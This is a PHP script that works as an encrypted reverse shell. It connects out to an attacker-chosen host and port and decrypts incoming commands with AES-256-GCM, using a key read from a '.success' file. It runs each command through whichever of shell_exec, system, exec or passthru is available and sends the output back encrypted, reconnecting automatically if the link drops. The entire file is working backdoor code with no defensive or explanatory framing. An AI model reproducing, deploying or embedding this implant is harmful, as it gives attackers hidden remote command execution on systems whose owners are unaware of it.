#!/usr/bin/php -q
<?php

	// cp .success

	//error_reporting(0);
	set_time_limit(0);
	ob_implicit_flush(1);

	$short = "h:p:";
	$long  = array(
		"host:",
		"port:"
	);
	$opts  = getopt($short,$long);


	if(count($opts) < 2){
		die("Assign remote ip [-h/--host] and port [-p/--port]\n");
	}

	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);

	if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
	     die("[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n");
	}

	echo "Connecting to [".$addr.":".$port."]...\n";

	if ((@$result = socket_connect($socket, $addr, $port)) === false){
	    die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");
	} 

	$key = file_get_contents(".success");
	define('KEY',$key);
	define('CYPHER', 'aes-256-gcm');


	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";

	while (true) {

		$now = date('d/m H:i:s');

		// implement socket_recv() for infinite data read

	    if(($recv = socket_read($socket, 4096)) === false || $recv === "")
	    {
	    	// try to reconnect - 10 sec interval

	    	echo "[\33[91m!\33[0m] Empty stream.. Disconnected.\n";
	    	sleep(3);

    		if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
	     		 echo "[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n";
			}

			echo "Connecting to [".$addr.":".$port."]...\n";

			if ((@$result = socket_connect($socket, $addr, $port)) === false){
			    echo "[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n";
			} 

			else echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";

	    }
	    else
	    {
	    	$recv = __decrypt($recv);


	    	if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
	    	{
	    		break;
	    	}

			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($recv));
			$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";

			if(function_exists('shell_exec'))
			{
				$fnc = "shell_exec()";
				if(($result = shell_exec($full_cmd)) === null)
				{
					$result = "Error";
				}
			}

			else if(function_exists('system'))
			{ 	
				$fnc = "system()";
				@ob_start(); 	

				if(($result = @system($full_cmd)) === false)
				{
					$result = "Error";
				}

				$result = @ob_get_contents(); 		
				@ob_end_clean(); 
			}

			else if(function_exists('exec'))
			{ 
				$fnc = "exec()";
				@exec($full_cmd,$results,$ret_status);

				if($ret_status !== 0)
				{
					$result = "Error status: ". $ret_status;
				}

				$result = ""; 		

				foreach($results as $res)
				{ 			
					$result .= $res."\n\r"; 		
				} 
			}

			else if(function_exists('passthru'))
			{ 		
				$fnc = "passthru()";
				@ob_start(); 		
				@passthru($full_cmd); 		
				$result = @ob_get_contents(); 		
				@ob_end_clean(); 
			}

			else
			{
				$result = "Error :: System calls disabled..";
			}
			

			$result .= "\n\rexecuted:: $fnc\n\rcmd:: $full_cmd";
			$result = __encrypt($result);

    		if(socket_write($socket, $result ,strlen($result)) === false)
    		{	
    			continue;
	        }
	    }
	}
	echo "Closing socket.\n";
	socket_close($socket);
	exit(0);

	
	/*:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/


	function __encrypt($message)
	{
		$msg = base64_encode($message);

		if(in_array(CYPHER, openssl_get_cipher_methods()))
		{
			$ivlen     = openssl_cipher_iv_length(CYPHER);
			$iv        = openssl_random_pseudo_bytes($ivlen);
			$cyphertxt = openssl_encrypt($msg, CYPHER, KEY, $options=0, $iv, $tag);
		}

	    return base64_encode($cyphertxt).':'.bin2hex($iv).':'.bin2hex($tag);
	}

	function __decrypt($input)
	{
		$encrypted  = explode(":", $input);
		
		$cyphertext =  base64_decode($encrypted[0]);
		$iv         =  hex2bin($encrypted[1]);
		$tag        =  hex2bin($encrypted[2]);

		$original = openssl_decrypt($cyphertext, CYPHER, KEY, $options=0, $iv, $tag);

		return base64_decode($original);
	}
?>
